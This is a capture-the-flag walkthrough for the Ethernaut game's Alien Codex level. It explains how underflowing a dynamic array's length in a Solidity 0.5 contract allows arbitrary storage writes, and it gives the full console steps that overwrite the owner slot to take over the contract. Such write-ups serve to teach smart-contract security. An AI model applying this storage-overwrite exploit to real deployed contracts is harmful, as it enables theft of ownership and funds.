# Level 19: Alien Codex

This is the level 19 of OpenZeppelin [Ethernaut](https://ethernaut.openzeppelin.com/) web3/solidity based game.

## Pre-requisites

- Contract [storage mechanism](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/) for dynamically sized arrays
- Integer [overflow/underflow](https://docs.soliditylang.org/en/v0.6.0/security-considerations.html#two-s-complement-underflows-overflows) in Solidity
- [Storage slot assignment in contract on inheritance](https://ethereum.stackexchange.com/questions/63403/in-solidity-how-does-the-slot-assignation-work-for-storage-variables-when-there)

## Hack

Given contract:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

`player` has to claim ownership of `AlienCodex`.

The target `AlienCodex` implements ownership pattern so it must have a `owner` state variable of `address` type, which can also be confirmed upon inspecting ABI (`contract.abi`). Moreover, the 20 byte `owner` is stored at slot 0 (as well as 1 byte bool `contact`).

Before we start, note that every contract on Ethereum has storage like an array of 2<sup>256</sup> (indexing from 0 to 2<sup>256</sup> - 1) slots of 32 byte each.

The vulnerability of `AlienCodex` originates from the `retract` method which sets a new array length without checking a potential underflow. Initially, `codex.length` is zero. Upon invoking `retract` method once, 1 is subtracted from zero, causing an underflow. Consequently, `codex.length` becomes 2<sup>256</sup> which is exactly equal to total storage capacity of the contract! That means any storage slot of the contract can now be written by changing the value at proper index of `codex`! This is possible because EVM doesn't validate an array's ABI-encoded length against its actual payload.

First call `make_contact` so that we can pass check - `contacted`, on other methods:
```javascript
await contract.make_contact()
```

Modify `codex` length to 2<sup>256</sup> by invoking `retract`:
```javascript
await contract.retract()
```

Now, we have to calculate the index, `i` of `codex` which corresponds to slot 0 (where `owner` is stored).

Since, `codex` is dynamically sized only it's length is stored at next slot - slot 1. And it's location/position in storage, according to allocation rules, is determined by as `keccak256(slot)`:
```
p = keccak256(slot)
or, p = keccak256(1)
```

Hence, storage layout would look something like:
```
Slot        Data
------------------------------
0             owner address, contact bool
1             codex.length
    .
    .
    .
p             codex[0]
p + 1         codex[1]
    .
    .
2^256 - 2     codex[2^256 - 2 - p]
2^256 - 1     codex[2^256 - 1 - p]
0             codex[2^256 - p]  (overflow!)
```
Form above table it can be seen that slot 0 in storage corresponds to index, `i` = `2^256 - p` or `2^256 -  keccak256(1)` of `codex`!

So, writing to that index, `i` will change `owner` as well as `contact`.

You can go on write some Solidity to calculate `i` using `keccak256`, but it can also be done in console which I'm going to use.

Calculate position, `p` in storage of start of `codex` array
```javascript
// Position
p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))

// Output: 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
```

Calculate the required index, `i`. Use `BigInt` for mathematical calculations between very large numbers.
```javascript
i = BigInt(2 ** 256) - BigInt(p)

// Output: 35707666377435648211887908874984608119992236509074197713628505308453184860938n
```

Now since value to be put must be 32 byte, pad the `player` address on left with `0`s to make a total of 32 byte. Don't forget to slice off `0x` prefix from player address!
```javascript
content = '0x' + '0'.repeat(24) + player.slice(2)

// Output: '0x000000000000000000000000<20-byte-player-address>'
```

Finally call revise to alter the storage slot:
```javascript
await contract.revise(i, content)
```

And we hijacked `AlienCodex`! Verify by:
```javascript
await contract.owner() === player

// Output: true
```

Done!

_Learned something awesome? Consider starring the [github repo](https://github.com/theNvN/ethernaut-openzeppelin-hacks)_ 😄

_and following me on twitter [here](https://twitter.com/heyNvN)_ 🙏
